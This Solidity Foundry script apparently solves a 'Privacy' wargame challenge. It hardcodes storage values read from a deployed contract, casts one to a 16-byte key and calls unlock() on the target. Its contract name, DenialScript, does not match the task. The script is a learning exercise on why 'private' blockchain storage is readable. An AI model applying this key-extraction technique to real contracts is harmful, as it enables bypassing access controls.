// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Privacy, Attack} from "../src/Privacy.sol";

contract DenialScript is Script {
    address DEPLOYED_CONTRACT_ADDRESS = 0x925CD79CE098576f70dA1CDF7319b0240a209dba;

    function setUp() public {}

    event Log16(bytes16);

    function run() public {
        vm.startBroadcast();

        bytes32[3] memory data;
        
        data[0] = 0xb5cd4dd5b90369c3a1c4f0bfbe027fc3c8749e32fe6caa5ea33c39f6b89da969;
        data[1] = 0xf75530c3514f98c465fe88807d5728dc5d3a0caa9c4cc57a343a6668011db5cc;
        data[2] = 0x224996fc341ac90c76a1188273f7d1439e4720065ad24a4a3d33c57dbb9ec0cb;
        
        bytes16 key = bytes16(data[2]);
        // emit Log16(bytes16(data[2]));
        
        Privacy target = Privacy(DEPLOYED_CONTRACT_ADDRESS);

        target.unlock(key);

        vm.stopBroadcast();
    }
}